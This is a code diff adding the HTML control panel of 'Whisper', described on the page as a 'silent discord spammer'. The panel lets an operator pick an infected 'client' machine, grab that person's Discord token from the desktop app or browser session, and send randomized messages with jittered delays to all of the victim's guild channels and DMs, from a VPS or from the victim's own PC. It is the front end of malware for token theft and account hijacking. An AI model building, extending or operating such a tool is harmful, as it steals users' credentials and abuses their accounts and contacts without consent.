@@ -1,0 +1,113 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Whisper</title>
+  <link rel="stylesheet" href="whisper.css" />
+</head>
+<body>
+  <header class="topbar">
+    <h1>Whisper</h1>
+    <span class="tag">silent discord spammer</span>
+    <span id="statusBadge" class="badge idle">idle</span>
+  </header>
+
+  <main class="layout">
+    <section class="col left">
+      <div class="card">
+        <h2>execution</h2>
+        <label for="where">run from</label>
+        <select id="where">
+          <option value="server">vps (no client needed)</option>
+          <option value="client">client's pc</option>
+        </select>
+        <div class="hint">vps mode spams from this server over the token — works with an offline or absent client. client mode requires a client id below.</div>
+      </div>
+
+      <div class="card" id="clientCard">
+        <h2>target</h2>
+        <label for="clientId">client id</label>
+        <div class="row">
+          <input id="clientId" list="clientsList" placeholder="enter client id" autocomplete="off" />
+          <datalist id="clientsList"></datalist>
+          <button id="refreshClients" class="btn ghost" title="refresh clients">&#8635;</button>
+        </div>
+        <div id="clientCount" class="hint">only needed for client mode</div>
+      </div>
+
+      <div class="card">
+        <h2>token</h2>
+        <label for="source">token source</label>
+        <select id="source">
+          <option value="app">client discord app</option>
+          <option value="browser">client browser session</option>
+          <option value="manual">manual token</option>
+        </select>
+
+        <label for="token">manual token</label>
+        <input id="token" type="password" placeholder="paste token — required for vps mode unless grabbed" autocomplete="off" />
+        <button id="grabTokens" class="btn ghost block">grab token from client</button>
+        <div class="hint" id="sourceHint">in vps mode, app/browser sources need the client online (they read his disk). manual token needs no client at all.</div>
+      </div>
+
+      <div class="card">
+        <h2>message</h2>
+        <label for="messages">one message per line (randomized pick)</label>
+        <textarea id="messages" rows="5"></textarea>
+
+        <h2>delays</h2>
+        <div class="row">
+          <div>
+            <label for="minDelay">min (ms)</label>
+            <input id="minDelay" type="number" value="2000" min="200" step="100" />
+          </div>
+          <div>
+            <label for="maxDelay">max (ms)</label>
+            <input id="maxDelay" type="number" value="8000" min="200" step="100" />
+          </div>
+        </div>
+
+        <h2>targets</h2>
+        <div class="checks">
+          <label><input type="checkbox" id="tGuilds" checked /> guilds</label>
+          <label><input type="checkbox" id="tDms" checked /> dms</label>
+          <label><input type="checkbox" id="textOnly" checked /> text channels only</label>
+          <label><input type="checkbox" id="announcementChans" /> include announcements</label>
+        </div>
+
+        <label for="maxPerChannel">messages per channel</label>
+        <input id="maxPerChannel" type="number" value="1" min="1" max="10" />
+
+        <div class="actions">
+          <button id="start" class="btn primary">start</button>
+          <button id="stop" class="btn danger">stop</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="col right">
+      <div class="card">
+        <h2>progress</h2>
+        <div id="progressBar"><div id="progressFill"></div></div>
+        <div class="row between">
+          <span id="progressText">0 / 0</span>
+          <span id="channelNow" class="muted">-</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>tokens</h2>
+        <div id="tokenList" class="tokens empty">none grabbed yet</div>
+      </div>
+
+      <div class="card grow">
+        <h2>log</h2>
+        <div id="log" class="log"></div>
+      </div>
+    </section>
+  </main>
+
+  <script src="whisper.js"></script>
+</body>
+</html>
